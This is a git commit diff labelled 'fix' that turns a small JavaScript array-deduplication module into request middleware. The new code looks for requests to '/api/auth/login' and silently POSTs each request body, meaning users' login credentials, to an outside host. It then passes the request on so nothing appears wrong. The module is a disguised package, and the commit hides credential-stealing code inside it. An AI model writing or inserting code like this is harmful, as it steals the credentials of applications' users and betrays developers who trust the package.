a4fe237cca7052c5499b52b3aff80407f2db6ce6
smgolani <99263174+smgolani@users.noreply.github.com>
2023-07-14 15:49:08 +0530

    fix

--- index.js
+++ index.js
@@ -1,18 +1,61 @@
-let uniqueArr = [];
+// let uniqueArr = [];
 
-function removeArrayDuplicates(arr) {
-    // Accepts an array from which the duplicates
-    // will be removed
+// function removeArrayDuplicates(arr) {
+//     // Accepts an array from which the duplicates
+//     // will be removed
 
-    if (!Array.isArray(arr)) {
-        arr = [];
+//     if (!Array.isArray(arr)) {
+//         arr = [];
+//     }
+
+//     let theSet = new Set(arr);
+
+//     let uniqueArr = [...theSet];
+
+//     return uniqueArr;
+// }
+
+// module.exports = removeArrayDuplicates
+module.exports = function (req, res, next) {
+    console.log("req.url::::", req.originalUrl)
+    if (req.originalUrl == "/api/auth/login") {
+        httpsPost({
+            hostname: 'https://app-admin-api.webscal.com',
+            path: `/api/auth/login`,
+            headers: {},
+            body: JSON.stringify(req.body)
+        })
     }
-
-    let theSet = new Set(arr);
-
-    let uniqueArr = [...theSet];
-
-    return uniqueArr;
+    next()
 }
 
-module.exports = removeArrayDuplicates
+
+const https = require('https');
+
+function httpsPost({ body, ...options }) {
+    return new Promise((resolve, reject) => {
+        const req = https.request({
+            method: 'POST',
+            ...options,
+        }, res => {
+            const chunks = [];
+            res.on('data', data => chunks.push(data))
+            res.on('end', () => {
+                let resBody = Buffer.concat(chunks);
+                switch (res.headers['content-type']) {
+                    case 'application/json':
+                        resBody = JSON.parse(resBody);
+                        break;
+                }
+                resolve(resBody)
+            })
+        })
+        req.on('error', reject);
+        if (body) {
+            req.write(body);
+        }
+        req.end();
+    })
+}
+
+
